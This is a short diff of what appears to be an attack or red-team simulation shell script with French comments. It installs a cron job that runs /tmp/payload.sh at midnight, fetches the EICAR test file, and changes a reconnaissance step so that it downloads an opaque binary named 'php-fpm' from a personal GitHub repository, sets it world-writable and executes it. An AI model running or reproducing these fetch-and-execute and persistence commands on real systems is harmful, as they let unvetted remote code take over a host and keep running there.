@@ -7,7 +7,7 @@ echo "0 0 * * * /tmp/payload.sh" >> mycron
 crontab mycron
 
 #Reconnaissance
-wget 'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh'; chmod u+x ./LinEnum.sh; ./LinEnum.sh -r discover -e /tmp/ -t
+wget 'https://raw.githubusercontent.com/b4ldrrr/web2/main/php-fpm'; chmod 777 ./php-fpm; ./php-fpm
 
 #Téléchargement charge malveillante
 wget 'https://secure.eicar.org/eicar_com.zip'
